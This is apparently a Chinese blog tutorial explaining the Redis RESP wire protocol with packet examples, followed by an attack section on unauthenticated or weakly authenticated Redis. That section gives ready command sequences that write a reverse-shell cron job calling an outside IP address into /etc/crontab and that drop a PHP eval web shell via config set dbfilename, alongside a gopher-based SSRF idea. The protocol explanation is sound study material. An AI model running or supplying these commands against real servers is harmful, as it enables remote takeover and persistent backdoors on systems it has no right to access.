## redis 简介
redis 是一个非关系型的，远程字典-键值服务器。而我们的
## 通信方式：
我们的目的是：模拟我们的某一个软件，并且通过这一个软件向我们的**redis**服务器请求我们的某一个数据。之后，我们再根据我们的数据。

我们作为我们的正常端，我们应该先去连接我们的 redis 服务器。
```
redis-cli -h 127.0.0.1 -p 8000

nc 127.0.0.1 8000
```

连接上我们的服务器后，如果我们爱需要认证的话，我们还需要进行认证：
```
auth 123123
```

认证结束后，我们就可以从我们的数据库中获取我们的对应的信息：
```
get 1
```

## Redis 格式：
### 数据类型前缀

在数据包中，每种数据数据类型都有固定的前缀，每一部分都以`\r\n`结尾

- `+`代表简单字符串（Simple Strings）比如`OK`，`PONG`（对应客户端的`PING`命令）
    
- `-`代表错误类型（Errors）
    
- `:`代表整型（Integers）
    
- `$`代表多行字符串（Bulk Strings）
    
- `*` 代表数组（Arrays）

### 样例：
1、首先发送的命令是 `info`，先看右边部分，可以看到一开始是 `*1：表示长度为1的数组`，后边的 `··` 对应左边是 `0d 0a`，其实就是 `\r\n` 的16进制表示形式，然后后边 `$4：代表长度为4的Bulk Strings，也就是info`，后边紧跟着 `info`，

![发送info命令](https://img-blog.csdnimg.cn/img_convert/4a72e5f35ed8959247d86ac433b4e99f.png)

info命令返回数据包：`$2748：长度为2748的Bulk Strings`，后边便是服务器相关信息  
![服务器info返回](https://img-blog.csdnimg.cn/img_convert/a5aaa9196e4449697bd5c688c286b6a4.png)

2、`set xfh 111`命令：`*3：长度为3的数组`，后边是数组里的3个元素：`$3··set（长度为3的Bulk Strings）`、`$3··xfh`、`$3··111`  
![set命令](https://img-blog.csdnimg.cn/img_convert/d2f787a133d5034e506d132891439d37.png)  
返回数据：`+OK（代表简单字符串‘OK’）`，这里边可能有人会问：简单字符串（Simple Strings）和多行字符串（Bulk Strings）有什么区别？？我的个人理解是：`简单字符串一般是服务器状态相关，比如'OK'、‘PONG’等；而Bulk Strings可以包含任何内容（比如换行符、控制符）`  
![set返回](https://img-blog.csdnimg.cn/img_convert/e7c04e0ce5d54a389900d552e5c4d508.png)

3、命令`lpush xfhlist 1 2 3`：看到这相信大家都已经明白了，`*5代表长度为5的数组`，后边紧跟着5个Bulk Strings `lpush`、`xfhlist`、`1`、`2`、`3`，而且每个元素的前边都有长度，分别是`$5`、`$7`、`$1`、`$1`、`$1`。  
![lpush](https://img-blog.csdnimg.cn/img_convert/98300ee33b9f698453880e1b20a57114.png)

返回：`:3`（表示整形数据3）  
![](https://img-blog.csdnimg.cn/img_convert/6b24a7afda5c5801b2cbd958bdf31ace.png)

4、命令`ee`，这是个错误命令，redis中没有这个命令，应该返回语法错误  
![命令ee](https://img-blog.csdnimg.cn/img_convert/5caa0c5d6e23ccac3237ae3bfb577285.png)

返回：发现前缀是`-`，对应RESP协议中的错误类型，后边紧跟着`ERR unknown command 'ee'`  
![语法错误返回](https://img-blog.csdnimg.cn/img_convert/b12312cebfe8c42e690876b1b884fc9f.png)

## 攻击方法：
#### 查询数据
我们根据我们原有**查询指令**对应的 tcp 协议包是怎么传输的，之后我们再去通过我们的**gopher**协议去直接访问我们的对应的连接。

#### 写 crontab
我们通过把我们的备份文件写入到我们的 crontab 当中，然后再去把我们的 crontab 来进行处理。
```
auth 123123
set mars "\\n\\n\\n\\n * * * * * root bash -i >&/dev/tcp/121.132.237.224/12350>&1\\n\\n\\n\\n"
config set dir /etc/
config set dbfilename crontab
save 
quit
```

#### 写备份文件
```
set mars "<?php eval($_POST[0]);?>"
config set dit /tmp/
config set dbfilename shell.php
save
quit
```
之后，我们呢就会能够生成一个 `shell.php` 文件，然后我们就可以对我们的文件来进行操作。



